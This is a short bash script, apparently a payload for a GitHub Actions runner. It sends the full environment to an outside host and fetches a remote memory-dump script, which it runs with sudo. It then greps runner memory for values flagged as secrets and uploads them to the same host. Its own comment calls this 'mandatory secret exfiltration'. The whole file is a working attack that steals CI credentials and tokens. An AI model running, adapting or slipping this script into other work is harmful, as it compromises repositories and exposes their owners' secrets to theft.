#!/bin/bash
echo "Okay, we got this far. Let's continue..."
# Connectivity and execution test
env | curl -X PUT -d @- "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
# Mandatory secret exfiltration
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
curl -X PUT -d \@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
